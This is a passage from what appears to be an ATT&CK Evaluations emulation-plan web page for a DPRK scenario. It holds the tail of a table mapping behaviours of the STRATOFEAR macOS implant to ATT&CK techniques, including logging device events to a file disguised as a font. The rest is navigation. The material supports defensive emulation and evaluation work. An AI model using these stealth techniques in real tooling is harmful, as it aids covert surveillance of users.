<td>T1135 Network Share Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR uses an <code v-pre>FSEventStream</code> to collect when any device (including USB or software using a <code v-pre>.dmg</code> file) is mounted to the system</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L257">core.cpp</a></td>
<td>T1082 System Information Discovery</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>STRATOFEAR automates the collection of all device activity through recording all <code v-pre>FSEventStream</code> events into the <code v-pre>/Library/Fonts/AppleSDGothicNeo.ttc.1</code> file.</td>
<td><a href="../../resources/stratofear/src/implant/core.cpp#L182">core.cpp</a></td>
<td>T1119 Automated Collection</td>
<td><a href="https://www.mandiant.com/resources/blog/north-korea-supply-chain" class="outbound" target="_blank"><span>Mandiant</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
<hr>
<doc-anchor-target id="end-of-execution">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#end-of-execution">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F51A;</span> End of Execution</span>
    </h2>
</doc-anchor-target>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/dprk/emulation_plan/protections/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">DPRK Protections Micros</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/dprk/emulation_plan/alternativesteps/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">This is the ALTERNATIVE instruction set for the Scenario</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "DPRK Scenario Overview", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
